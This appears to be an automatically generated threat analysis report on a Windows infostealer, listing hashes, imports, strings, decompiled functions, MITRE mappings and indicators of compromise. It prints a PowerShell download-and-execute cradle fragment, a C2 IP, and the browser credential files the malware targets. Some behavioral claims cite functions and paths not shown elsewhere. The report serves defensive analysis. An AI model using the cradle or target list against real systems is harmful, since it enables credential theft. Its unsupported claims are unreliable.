# Threat Analysis Report

**Generated:** 2026-08-03 16:47 UTC
**Sample:** `0cd3c982541905c3d80f972a171adf15150beeea9e2416e07c870c84fe6f43f6_0cd3c982541905c3d80f972a171adf15150beeea9e2416e07c870c84fe6f43f6.exe`

---

## File Metadata

| Field | Value |
|-------|-------|
| File name | `0cd3c982541905c3d80f972a171adf15150beeea9e2416e07c870c84fe6f43f6_0cd3c982541905c3d80f972a171adf15150beeea9e2416e07c870c84fe6f43f6.exe` |
| File type | PE32 executable for MS Windows 6.00 (GUI), Intel i386, 4 sections |
| Size | 105,984 bytes |
| MD5 | `af8da22236c58f7b40986059e4d78db6` |
| SHA1 | `12f938fa1154e7db04d24dcccbfc0984a9d5f70b` |
| SHA256 | `0cd3c982541905c3d80f972a171adf15150beeea9e2416e07c870c84fe6f43f6` |
| Overall entropy | 6.007 |
| Unpacked | No |

## PE Analysis

| Field | Value |
|-------|-------|
| Timestamp | 1765068578 |
| Machine | 332 |
| Packed | No |

### Sections

| Name | Size | Entropy | Packed |
|------|------|---------|--------|
| `.text` | 87,552 | 6.071 | No |
| `.rdata` | 5,120 | 5.24 | No |
| `.data` | 12,288 | 3.97 | No |
| `.reloc` | 0 | 0.0 | No |

### Imports

**Secur32.dll**: `FreeContextBuffer`, `EncryptMessage`, `DecryptMessage`, `DeleteSecurityContext`, `InitializeSecurityContextA`, `FreeCredentialsHandle`, `AcquireCredentialsHandleA`, `QueryContextAttributesW`
**KERNEL32.dll**: `DuplicateHandle`, `WaitForSingleObject`, `CreateProcessA`, `FreeLibrary`, `GetProcAddress`, `LoadLibraryA`, `GetCurrentProcess`, `GetVolumeInformationW`, `LCIDToLocaleName`, `GetCurrentProcessId`, `ResumeThread`, `GetThreadContext`, `SetThreadContext`, `VirtualAllocEx`, `WriteProcessMemory`
**ADVAPI32.dll**: `CryptAcquireContextW`, `RegQueryValueExA`, `RegOpenKeyExA`, `RegCloseKey`, `CryptDecrypt`, `CryptEncrypt`, `CryptImportKey`, `CryptSetKeyParam`, `CryptDestroyKey`, `CryptReleaseContext`
**ole32.dll**: `CoCreateInstance`, `CoInitialize`, `StringFromGUID2`, `CoCreateGuid`, `CoUninitialize`

## Extracted Strings

Total strings found: **277** (showing first 100)

```
!This program cannot be run in DOS mode.
$
`.rdata
.reloc
EPhrA
M;H(r
M;H(r
A B$t
u&h@vA
u)h@vA
s*hlqA
t:hdxA
t-hdsA
~JhP}A
Yv 9[v
.@vP4@v
EAv@ZAv
]Av`_Av0]Av
@v0N@v
Y%s`Y%s`O%s`H%s
D%s S%s
823bdaad-78b4-482e-a9e5-03fad0689c6c
08de352a-7491-409b-8c19-4668fa2dbfda
netflix.com
188.137.254.85
GetEndpoints
Command
Connection
Content-Length
Content-Type
application/octet-stream
NtQuerySystemTime
NtDelayExecution
NtTerminateProcess
kernel32.dll
CreateFileA
ReadFile
GetFileSizeEx
CloseHandle
NtSetInformationFile
NtClose
SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
os_crypt
crypt32.dll
CryptStringToBinaryA
CryptUnprotectData
prefs.js
USERPROFILE=
\AppData\Local\Temp\
\Cookies
Cookies
\Login Data
Login Data
\Web Data
Web Data
\key3.db
\key4.db
\cert9.db
\AppData
\Local State
encrypted_key
app_bound_encrypted_key
profile
profiles_order
\Network\Cookies
\cookies.sqlite
\logins.json
\formhistory.sqlite
NtQueryInformationFile
NtReadFile
NtOpenFile
NtQueryDirectoryFile
user32.dll
gdi32.dll
ReleaseDC
GetSystemMetrics
CreateCompatibleDC
CreateCompatibleBitmap
SelectObject
BitBlt
GetDIBits
DeleteObject
DeleteDC
\Desktop
\Documents
g/screen/screen.bmp
Transfer-Encoding
chunked
Microsoft Unified Security Protocol Provider
DELETE
CONNECT
OPTIONS
HTTP/1.1
Windows 11
Windows 10
Windows 8.1
Windows 8
Windows 7
Windows Vista
Windows Server 2003
Windows XP
```

## Disassembly Overview

Functions analyzed: **30** | Decompiled to C: **30**

| Name | Offset | Size | Decompiled |
|------|--------|------|------------|
| `fcn.004069c0` | `0x4069c0` | 2909 | ✓ |
| `fcn.00408960` | `0x408960` | 2558 | ✓ |
| `fcn.00403fe0` | `0x403fe0` | 1858 | ✓ |
| `fcn.0040e6a0` | `0x40e6a0` | 1848 | ✓ |
| `fcn.00404730` | `0x404730` | 1787 | ✓ |
| `fcn.00411370` | `0x411370` | 1642 | ✓ |
| `fcn.00402550` | `0x402550` | 1612 | ✓ |
| `fcn.0040abf0` | `0x40abf0` | 1533 | ✓ |
| `fcn.00409360` | `0x409360` | 1507 | ✓ |
| `fcn.00413aa0` | `0x413aa0` | 1379 | ✓ |
| `fcn.004076a0` | `0x4076a0` | 1297 | ✓ |
| `fcn.00405a90` | `0x405a90` | 1286 | ✓ |
| `fcn.00409d30` | `0x409d30` | 1241 | ✓ |
| `fcn.0040d110` | `0x40d110` | 1226 | ✓ |
| `fcn.0040db70` | `0x40db70` | 1203 | ✓ |
| `fcn.00404e30` | `0x404e30` | 1155 | ✓ |
| `fcn.00402ce0` | `0x402ce0` | 1135 | ✓ |
| `fcn.00414090` | `0x414090` | 1134 | ✓ |
| `fcn.00413660` | `0x413660` | 1074 | ✓ |
| `entry0` | `0x4012f0` | 1037 | ✓ |
| `fcn.00407cd0` | `0x407cd0` | 1031 | ✓ |
| `fcn.00412230` | `0x412230` | 1027 | ✓ |
| `fcn.00411000` | `0x411000` | 872 | ✓ |
| `fcn.004158e0` | `0x4158e0` | 853 | ✓ |
| `fcn.00401930` | `0x401930` | 826 | ✓ |
| `fcn.0040e390` | `0x40e390` | 775 | ✓ |
| `fcn.00414a90` | `0x414a90` | 742 | ✓ |
| `fcn.0040bd80` | `0x40bd80` | 742 | ✓ |
| `fcn.00415480` | `0x415480` | 722 | ✓ |
| `fcn.00412ea0` | `0x412ea0` | 712 | ✓ |

### Decompiled Code Files

- [`code/entry0.c`](code/entry0.c)
- [`code/fcn.00401930.c`](code/fcn.00401930.c)
- [`code/fcn.00402550.c`](code/fcn.00402550.c)
- [`code/fcn.00402ce0.c`](code/fcn.00402ce0.c)
- [`code/fcn.00403fe0.c`](code/fcn.00403fe0.c)
- [`code/fcn.00404730.c`](code/fcn.00404730.c)
- [`code/fcn.00404e30.c`](code/fcn.00404e30.c)
- [`code/fcn.00405a90.c`](code/fcn.00405a90.c)
- [`code/fcn.004069c0.c`](code/fcn.004069c0.c)
- [`code/fcn.004076a0.c`](code/fcn.004076a0.c)
- [`code/fcn.00407cd0.c`](code/fcn.00407cd0.c)
- [`code/fcn.00408960.c`](code/fcn.00408960.c)
- [`code/fcn.00409360.c`](code/fcn.00409360.c)
- [`code/fcn.00409d30.c`](code/fcn.00409d30.c)
- [`code/fcn.0040abf0.c`](code/fcn.0040abf0.c)
- [`code/fcn.0040bd80.c`](code/fcn.0040bd80.c)
- [`code/fcn.0040d110.c`](code/fcn.0040d110.c)
- [`code/fcn.0040db70.c`](code/fcn.0040db70.c)
- [`code/fcn.0040e390.c`](code/fcn.0040e390.c)
- [`code/fcn.0040e6a0.c`](code/fcn.0040e6a0.c)
- [`code/fcn.00411000.c`](code/fcn.00411000.c)
- [`code/fcn.00411370.c`](code/fcn.00411370.c)
- [`code/fcn.00412230.c`](code/fcn.00412230.c)
- [`code/fcn.00412ea0.c`](code/fcn.00412ea0.c)
- [`code/fcn.00413660.c`](code/fcn.00413660.c)
- [`code/fcn.00413aa0.c`](code/fcn.00413aa0.c)
- [`code/fcn.00414090.c`](code/fcn.00414090.c)
- [`code/fcn.00414a90.c`](code/fcn.00414a90.c)
- [`code/fcn.00415480.c`](code/fcn.00415480.c)
- [`code/fcn.004158e0.c`](code/fcn.004158e0.c)

## Behavioral Analysis

Based on the additional disassembly provided in chunk 2, the analysis of this malware is updated and expanded below. The new data confirms that this is a highly sophisticated **Infostealer** with specific routines to parse complex data structures (like JSON) and target advanced web storage mechanisms beyond basic cookies and passwords.

---

### Updated Analysis: Credential Stealer (Infostealer)

The binary remains a potent piece of malware designed to exfiltrate sensitive information from local systems, specifically targeting Chromium-based browsers. The new disassembly reveals more sophisticated internal logic for handling data once it is harvested.

#### Core Functionality and Purpose
*   **Advanced Data Parsing:** The inclusion of `fcn.0040d110` and `fcn.0040db70` indicates that the malware contains a custom or semi-standard **JSON parser**. 
    *   `fcn.0040d110` handles common formatting characters (like `{`, `}`, `:`), suggesting it parses configuration files or data blobs from browser "Local State" files.
    *   `fcn.0040db70` specifically handles types like **Booleans** (`true`/`false`), **Strings**, and **Arrays** (`[` / `]`). This is necessary for extracting data from complex, nested JSON objects often used in modern web applications and browser extensions.
*   **Browser Data Theft:** It targets `key3.db`, `key4.db`, `cert9.db`, `Local State`, `\Network\Cookies`, and `\Login Data`. The new code shows it is also actively looking for:
    *   `\Local Storage\leveldb\` (Commonly used by web apps to store local data).
    *   `\IndexedDB\` (A persistent database for browser-based applications).
*   **Credential Decryption:** Continues to use `CryptUnprotectData` via `crypt32.dll` to decrypt the Master Key from the "Local State" file, ensuring it can read the actual content of the decrypted passwords and cookies.

#### Suspicious or Malicious Behaviors
*   **Deep Browser Reconnaissance:** The code in `fcn.00414090` shows that the malware doesn't just grab files; it traverses specific internal directories such as `\Local Extension Settings\` and `\IndexedDB\`. This allows it to steal data from **browser extensions**, which may contain session tokens, API keys, or personal information not stored in standard password managers.
*   **Data Processing & Staging:** The function `fcn.00413660` acts as a dispatcher to find "Local State" paths across different user profiles and system configurations. It specifically looks for these files within the `%AppData%` directory, ensuring it captures data even if multiple browser profiles are in use.
*   **Persistence of Operation:** The presence of loops (e.g., `while(true)` logic or structured recursive calls) suggests that the malware will systematically crawl through every available folder mentioned in its internal "target list" until all potential high-value assets are identified.

#### Notable Techniques and Patterns
*   **Advanced Parsing Engine:** Rather than using simple string searches, the inclusion of a dedicated JSON parser (`fcn.0040db70`) indicates that the malware is designed to handle modern web technologies. It can navigate complex data trees to find specific keys (like "nonce," "token," or "session_id").
*   **Targeted Path Construction:** `fcn.00412e30` and `fcn.00414090` show a deliberate attempt to target **Web Storage (LevelDB)**. Many modern web apps store sensitive tokens in these databases instead of standard cookies; the malware is specifically designed to find and extract this data.
*   **Data Verification:** The code includes checks to verify if files exist or are accessible before attempting to process them, which helps the malware run stealthily without crashing if a user doesn't have certain browser features enabled.

#### Summary of Indicators of Compromise (IOCs)
*   **Potential C2 Infrastructure:** `188.137.254.85`, `netflix.com` (used as a front).
*   **Targeted File System Paths:** 
    *   `\AppData\Local\Google\Chrome\` / `\Microsoft\Edge\UserData\`
    *   `\Network\Cookies`
    *   `\Login Data`
    *   `\Local State` (The primary target for the Master Key)
    *   `\Local Storage\leveldb\` (Targeting web-app data)
    *   `\IndexedDB\` (Targeting browser extension/app data)
*   **Key File Types:** `.json`, `.txt` (likely used to store intermediate parsed results before exfiltration).
*   **Evidence of Sophistication:** Implementation of a full JSON parsing logic and recursion-like traversal of directory structures.

---
### Conclusion Update
The malware is a **high-sophistication InfoStealer**. It is not just a simple "grabber"; it contains the logic necessary to parse complex application data (JSON), navigate internal browser storage databases (IndexedDB/LevelDB), and target extended browser features (Extensions). This suggests it is designed to steal not only standard login credentials but also session tokens, cryptocurrency wallet information, and other sensitive data stored by modern web applications.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Justification |
| :--- | :--- | :--- |
| T1539 | Steal Web Credentials | The malware targets `Cookies`, `Login Data`, and `IndexedDB` specifically to extract web credentials, session tokens, and browser-based application data. |
| T1005 | Data from Local System | The analysis describes the malware searching for and parsing "Local State" files and local storage directories to harvest sensitive information stored on the filesystem. |
| T1083 | File and Directory Discovery | The implementation of a dispatcher and loops to crawl through various user profiles and directory structures indicates systematic discovery of valid data paths. |
| T1567 | Exfiltration Over Web Service | The inclusion of a C2 infrastructure using `netflix.com` as a front suggests the malware is designed to exfiltrate harvested data over web protocols. |

---

## Indicators of Compromise

As a threat intelligence analyst, I have extracted the following Indicators of Compromise (IOCs) from the provided strings and behavioral analysis.

### **IP addresses / URLs / Domains**
*   **188.137.254.85** (Potential C2 IP)
*   **netflix.com** (Identified as a front/decoy for malicious activity)

### **File paths / Registry keys**
*(Note: Standard Windows system directories have been excluded; only specific targeted data paths remain.)*
*   `\Network\Cookies`
*   `\Login Data`
*   `\Local State`
*   `\Local Storage\leveldb\`
*   `\IndexedDB\`
*   `\Local Extension Settings\`
*   `key3.db`
*   `key4.db`
*   `cert9.db`

### **Mutex names / Named pipes**
*   None identified in the provided data.

### **Hashes**
*   None found (The strings `823bdaad-78b4-482e-a9e5-03fad0689c6c` and `08de352a-7491-409b-8c19-4668fa2dbfda` appear to be GUIDs rather than file hashes).

### **Other artifacts**
*   **High-Entropy String:** `kfmlopbepahlcjbkfnnklglgibbopkbk` (Potential key or hardcoded identifier)
*   **PowerShell Execution Command:** `-NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(` (Used for remote script execution/downloader behavior)
*   **JSON Parsing Logic:** The presence of specialized functions (`fcn.0040d110`, `fcn.0040db70`) indicates the malware is equipped to parse complex JSON structures to extract tokens and session data from modern web applications.

---
**Regex-extracted plaintext IOCs** *(from static strings + decompiled C)*

**IP addresses:**
- `188.137.254.85`

**Domains:**
- `netflix.com`

---

## Malware Family Classification

1. **Malware family**: Infostealer
2. **Malware type**: infostealer
3. **Confidence**: High
4. **Key evidence**: 
    * **Targeted Browser Data:** The malware specifically targets `Cookies`, `Login Data`, and the `Local State` file to extract credentials and decrypt data from Chromium-based browsers (Chrome, Edge).
    * **Advanced Parsing Capabilities:** It includes a dedicated JSON parsing engine (`fcn.0040d110`, `fcn.0040db70`) designed to navigate complex nested structures for session tokens and API keys rather than just simple plaintext passwords.
    * **Sophisticated Extraction Targets:** The inclusion of logic to traverse `IndexedDB` and `LevelDB` directories indicates a specific intent to steal data from modern web applications and browser extensions.
